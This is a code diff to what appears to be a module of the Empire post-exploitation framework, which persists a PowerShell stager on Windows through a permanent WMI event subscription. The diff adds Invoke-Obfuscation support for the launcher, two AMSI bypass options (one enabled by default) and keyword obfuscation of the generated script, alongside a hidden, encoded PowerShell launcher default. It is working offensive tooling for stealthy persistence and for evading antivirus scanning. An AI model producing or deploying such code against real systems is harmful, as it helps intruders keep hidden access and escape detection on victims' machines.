@@ -1,7 +1,12 @@
+from __future__ import print_function
+
 import os
+from builtins import object
+
 from lib.common import helpers
 
-class Module:
+
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -11,6 +16,10 @@ class Module:
             'Author': ['@mattifestation', '@harmj0y', '@tristandostaler'],
 
             'Description': ('Persist a stager (or script) using a permanent WMI subscription. This has a difficult detection/removal rating.'),
+
+            'Software': '',
+
+            'Techniques': ['T1084'],
 
             'Background' : False,
 
@@ -43,11 +52,26 @@ class Module:
                 'Required'      :   True,
                 'Value'         :   'powershell -noP -sta -w 1 -enc '
             },
-            #'Listener' : {
-            #    'Description'   :   'Listener to use.',
-            #    'Required'      :   False,
-            #    'Value'         :   ''
-            #},
+            'Obfuscate': {
+                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
+                'Required': False,
+                'Value': 'False'
+            },
+            'ObfuscateCommand': {
+                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
+                'Required': False,
+                'Value': r'Token\All\1'
+            },
+            'AMSIBypass': {
+                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'True'
+            },
+            'AMSIBypass2': {
+                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'False'
+            },
             'DailyTime' : {
                 'Description'   :   'Daily time to trigger the script (HH:mm).',
                 'Required'      :   False,
@@ -107,7 +131,12 @@ class Module:
 
 
     def generate(self):
-        
+
+        # Set booleans to false by default
+        Obfuscate = False
+        AMSIBypass = False
+        AMSIBypass2 = False
+
         #listenerName = self.options['Listener']['Value']
         launcher_prefix = self.options['Launcher']['Value']
         
@@ -120,6 +149,13 @@ class Module:
         extFile = self.options['ExtFile']['Value']
         cleanup = self.options['Cleanup']['Value']
         webFile = self.options['WebFile']['Value']
+        if (self.options['Obfuscate']['Value']).lower() == 'true':
+            Obfuscate = True
+        ObfuscateCommand = self.options['ObfuscateCommand']['Value']
+        if (self.options['AMSIBypass']['Value']).lower() == 'true':
+            AMSIBypass = True
+        if (self.options['AMSIBypass2']['Value']).lower() == 'true':
+            AMSIBypass2 = True
         # staging options
         #userAgent = self.options['UserAgent']['Value']
         #proxy = self.options['Proxy']['Value']
@@ -150,7 +186,7 @@ class Module:
                 statusMsg += "using external file " + extFile
 
             else:
-                print helpers.color("[!] File does not exist: " + extFile)
+                print(helpers.color("[!] File does not exist: " + extFile))
                 return ""
 
         else:
@@ -162,7 +198,7 @@ class Module:
 
         # sanity check to make sure we haven't exceeded the powershell -enc 8190 char max
         if len(encScript) > 8190:
-            print helpers.color("[!] Warning: -enc command exceeds the maximum of 8190 characters.")
+            print(helpers.color("[!] Warning: -enc command exceeds the maximum of 8190 characters."))
             return ""
 
         # built the command that will be triggered
@@ -173,7 +209,7 @@ class Module:
             parts = dailyTime.split(":")
             
             if len(parts) < 2:
-                print helpers.color("[!] Please use HH:mm format for DailyTime")
+                print(helpers.color("[!] Please use HH:mm format for DailyTime"))
                 return ""
 
             hour = parts[0]
@@ -197,5 +233,5 @@ class Module:
 
 
         script += "'WMI persistence established "+statusMsg+"'"
-        
+        script = helpers.keyword_obfuscation(script)
         return script
